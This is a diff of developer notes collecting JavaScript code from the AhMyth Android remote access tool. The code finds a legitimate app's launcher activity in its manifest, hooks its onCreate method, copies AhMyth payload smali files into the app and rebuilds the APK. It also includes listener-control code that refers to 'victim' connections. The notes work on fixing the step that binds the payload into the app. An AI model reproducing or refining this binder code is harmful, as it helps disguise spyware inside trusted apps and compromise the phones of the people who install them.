@@ -1,4 +1,6 @@
-Launcher Extraction for `<application"` attribute | AppCtrl.js = Line 5658 --> 5707 |
+## Launcher Extraction for `<application"` attribute | AppCtrl.js |
+- Need to figure out how to add a secondary `<activity` regex if the `<application` regex returns -1
+- Need to figure out how to add third subsidiary `<activity-alias` regex for the `manifest.index("android:targetActivity")` section of this function if the first 2 regex's return -1
 ```javascript
 function GetLauncherActivity(manifest) {
 
@@ -16,20 +18,20 @@ function GetLauncherActivity(manifest) {
         'android.intent.action.MAIN'
         'android.intent.category.INFO',
         );
-    var indexOfApplication = -1;
+    var indexOfActivity = -1;
     
     if (indexOfLauncher != -1) {
         manifest = manifest.substring(0, indexOfLauncher);
         for (var i = indices.length - 1; i >= 0; i--) {
             if (indices[i] < indexOfLauncher) {
-                indexOfApplication = indices[i];
-                manifest = manifest.substring(indexOfApplication, manifest.length);
+                indexOfActivity = indices[i];
+                manifest = manifest.substring(indexOfActivity, manifest.length);
                 break;
             }
         }
 
 
-        if (indexOfApplication != -1) {
+        if (indexOfActivity != -1) {
 
             if (manifest.indexOf('android:targetActivity="') != -1) {
                 manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
@@ -56,13 +58,10 @@ function GetLauncherActivity(manifest) {
 ```
   
 
-OrgAppKey2 | Constants.js = Line 32 |
+## Sets of Code for the orgAppKey2
 ```javascript
 exports.orgAppKey2 = ';->onCreate()V';
 ```
-
-
-OrgAppKey2 specification | AppCtrl.js = Line 5553 --> 5560 |
 ```javascript
 var key = CONSTANTS.orgAppKey2;
 $appCtrl.Log("Modifiying launcher activity...");
@@ -74,7 +73,7 @@ fs.writeFile(launcherPath, output, 'utf8', (error) => {
     }
 ```
     
-Stop function for the AhMyth Listener | AppCtrl.js = Line 51 --> 77 |
+## Code Sets for function to stop listening | main.js + AppCtrl.js + build.html |
 ```javascript
     // when user clicks Disconnect Button
     $appCtrl.Stop = (port) => {
@@ -104,8 +103,6 @@ Stop function for the AhMyth Listener | AppCtrl.js = Line 51 --> 77 |
       ipcRenderer.send('closeLabWindow', 'lab.html', index)
     }
 ```
-  
-Stop function for the AhMyth Listener | Main.js = Line 131 --> 166 + Line 244 --> Line 253 |
 ```javascript 
 // fired when stopped listening for victim
 ipcMain.on("SocketIO:StopListen", function (event, port) {
@@ -155,34 +152,22 @@ process.on('uncaughtException', function (error) {
 
 });
 ```
-
-Stop function for the AhMyth Listener | index.html = Line 69 |
 ```html
 <button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
 ```
-## Sets of code to fix a major binding bug in AhMyth
-New function for copying AhMyth files to the original app
+## New complete Bind on Launch function
 ```js
-    // function to copy ahmyth source files to the orginal app
-    // and if success go to generate the apk
-    $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
+    $appCtrl.BindOnLauncher = (apkFolder) => {
 
-        $appCtrl.Log("Copying AhMyth Files to Orginal APK...");
+        $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
         $appCtrl.Log();
-        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, launcherPath), (error) => {
+        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
             if (error) {
-                $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log('Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
                 $appCtrl.Log();
                 return;
             }
 
-            $appCtrl.GenerateApk(apkFolder);
-        })
-
-    };
-```
-Existing functons updated for the newly created "Launcher Location function" contained in this snippet
-```javascript
             var launcherActivity = GetLauncherActivity(data, apkFolder);
             if (launcherActivity == -1) {
                 $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
@@ -246,7 +231,20 @@ Existing functons updated for the newly created "Launcher Location function" con
                                 return;
                             }
 
-                            $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
+                            var smaliFolder = (launcherPath.split("/")[0] + "/");
+
+                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
+                            $appCtrl.Log();
+                            fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
+                                if (error) {
+                                    $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
+                                    $appCtrl.Log();
+                                    return;
+                                }
+                                
+                                $appCtrl.GenerateApk(apkFolder)
+                    
+                            });
 
                         });
 
@@ -260,9 +258,8 @@ Existing functons updated for the newly created "Launcher Location function" con
 
     }
 ``` 
-New "GetLauncherActivity" function | supersedes the old "GetLauncherPath" function
+## New "GetLauncherActivity" function | supersedes the old "GetLauncherPath" function
 ```js
-//function to extract the launcher activity from the orginal app
 function GetLauncherActivity(manifest) {
 
 
